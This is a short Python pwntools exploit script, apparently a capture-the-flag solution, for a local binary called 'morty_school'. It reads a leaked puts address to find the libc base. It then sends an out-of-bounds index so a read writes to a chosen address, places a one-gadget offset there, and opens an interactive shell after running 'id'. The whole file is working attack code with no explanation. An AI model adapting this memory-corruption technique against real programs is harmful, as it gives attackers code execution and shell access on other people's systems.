from pwn import*
import time
context.log_level = 'debug'
p = process('./morty_school')
libc = ELF('./libc.so')
# raw_input(':')
p.recvuntil("information:")
puts = p.recv(15)
log.success('puts addr recv ->%s'%(puts))

libc_base = int(puts[3:],16) - libc.symbols['puts']
log.success('libc base ->'+hex(libc_base))

system = libc_base + libc.symbols['system']
log.success('system addr -> %s' % hex(system))
# for i in libc.got:
    # print(i)
# log.success('stack chk fail addr -> %s' % hex(p.symbols['__stack_chk_fail']))

p.recvuntil('teach?\n')

unk_6020A0=0x6020a0


p.sendline(str((0x4005d0-unk_6020A0-0x10)//24))

'''
v2 = read(0, *(void **)(v4 = (__int64)&unk_6020A0 + input*24 + 0x10), 0x100uLL);
'''
one=0x10a38c

p.recvuntil('message:\n')
p.sendline(p64(one))
p.recvuntil('again:\n')
p.sendline('\x00'*0x100)

time.sleep(0.5)
p.sendline('id')
p.interactive()